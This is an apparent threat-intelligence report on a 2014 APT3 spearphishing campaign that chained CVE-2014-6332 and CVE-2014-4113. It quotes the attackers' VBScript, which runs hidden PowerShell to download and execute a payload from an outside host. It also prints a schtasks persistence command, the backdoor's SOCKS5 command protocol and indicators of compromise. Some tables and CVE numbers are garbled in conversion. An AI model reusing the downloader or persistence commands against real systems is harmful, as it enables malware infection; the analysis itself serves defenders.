APT3 (also known as UPS), the actors responsible for Operation Clandestine Fox has
quietly continued to send waves of spearphishing messages over the past few months. This
actor initiated their most recent campaign on November 19, 2014 targeting multiple
organizations. The attacker leveraged multiple exploits, targeting both CVE-20146332 and CVE-2014-4113. CVE-2014-6332 was disclosed publicly on 2014-11-11 and is a
Windows OLE Automation Array Remote Code Execution vulnerability. CVE-2014-4113 is a
privilege escalation vulnerability that was disclosed publicly on 2014-10-14.

The use of CVE-2014-6332 is notable, as it demonstrates that multiple classes of actors,
both criminal and APT alike, have now incorporated this exploit into their toolkits. Further, the
use of both of these two known vulnerabilities in tandem is notable for APT3. This actor is
historically known for leveraging zero-day vulnerabilities in widespread but infrequent
phishing campaigns. The use of known exploits and more frequent attacks may indicate both
a shift in strategy and operational tempo for this group.

The webpage contained both CVE-2014-6332 exploit code and a VBScript that invoked
PowerShell on the affected users’ system to download the below payload:
function runmumaa()
On Error Resume Next
set shell=createobject("Shell.Application")
shell.ShellExecute "powershell.exe","-NoLogo -NoProfile
-NonInteractive WindowStyle Hidden ( New-Object
“System.Net.WebClient”).DownloadFile(“http://www.playboysplus.com
/install/install.exe”,”install.exe”);Invoke-Item install.exe", "",
"open", 1
end function
The CVE-2014-6332 exploit code seen in this incident is derived from the code published at
http://www.exploit-db.com/exploits/35230/, which has also been incorporated in the
Metasploit project.
The Downloader
After the exploit or script executes, the system downloads install.exe, which has the following
metadata:

The file install.exe attempts to write two files (doc.exe and test.exe) to the hard-coded path
“C:\Users\Public”, which fails on Windows XP because that path is not present by default.
The first dropped file, doc.exe, contains the CVE-2014-4113 exploit and then attempts to
execute test.exe with the elevated privileges. These files have the following metadata:
doc.exe (x86):

These payload files also have interesting PDB debug strings.

test.exe:

The most interesting PDB string is the “4113.pdb,” which appears to reference CVE-20144113. This CVE is a local kernel vulnerability that, with successful exploitation, would give
any user SYSTEM access on the machine.
The malware component, test.exe, uses the Windows command "cmd.exe" /C whoami” to
verify it is running with the elevated privileges of “System” and creates persistence by
creating the following scheduled task:
schtasks /create /tn "mysc" /tr C:\Users\Public\test.exe /sc ONLOGON

/ru "System"

When executed, the malware first establishes a SOCKS5 connection to 192.157.198.103
using TCP port 1913. The malware sends the SOCKS5 connection request "05 01 00" and
verifies the server response starts with "05 00". The malware then requests a connection to
192.184.60.229 on TCP port 81 using the command "05 01 00 01 c0 b8 3c e5 00 51" and
verifies that the first two bytes from the server are "05 00" (c0 b8 3c e5 is the IP address and
00 51 is the port in network byte order).
Once the connection to the server is established, the malware expects a message containing
at least three bytes from the server. These first three bytes are the command identifier. The
following commands are supported by the malware:
Command
ID

Description

00 00 00

Content after command ID is written to:
C:\Users\[Username]\AppData\Local\Temp\notepad1.exe

00 00 01

Deletes the files:
C:\Users\[Username]\AppData\Local\Temp\notepad.exe
C:\Users\[Username]\AppData\Local\Temp\newnotepad.exe

00 00 02

Malware exits

Malware downloads the URL that follows the command ID. The file is saved

00 00 04

Content after command ID is written to:
C:\Users\[Username]\AppData\Local\Temp\notepad2.exe

The files notepad1.exe and notepad2.exe are concatenated together and
written to C:\Users\[Username]\AppData\Local\Temp\newnotepad.exe and
executed

00 00 06

The contents of the following file is sent to the server:

The string following the command ID is executed using "cmd /C" and results
are sent to server

Links to APT3
On October 28, we observed APT3 sending out spearphishing messages containing a
compressed executable attachment. The deflated exe was a variant of the same downloader
described above and connected to 198.55.115.71 over port 1913 via SOCKS5 proxy. The
secondary payload in that case was detected as Backdoor.APT.CookieCutter (aka Pirpi) and
also named newnotepad.exe (MD5 8849538ef1c3471640230605c2623c67) and connected
to the known APT3 domains:
inform.bedircati[.]com
pn.lamb-site[.]com
210.109.99.64
The 192.184.60.229 IP address seen in this current campaign also hosts securitywap[.]com
– another known domain referenced in our Operation Clandestine Fox blog.

As we discussed in our previous blog detailing previous APT3 activity, the walterclean[.]com
served as a Plugx/Kaba command and control server.
Conclusion
Although APT3 is well known for employing zero-day exploits in their attacks, recent activity
has demonstrated that they will also attack targets with known exploits or social engineering.
Since Operation Clandestine Fox, we have observed this actor execute multiple attacks that
did not rely on zero-day exploits. The combination of this sustained operational tempo
and lack of zero-day exploits may indicate that this group has changed strategy and
has decided to attack more frequently and does not have steady access to zero-day
exploit code. No matter the strategy, this actor has shown an ability to operate successfully.
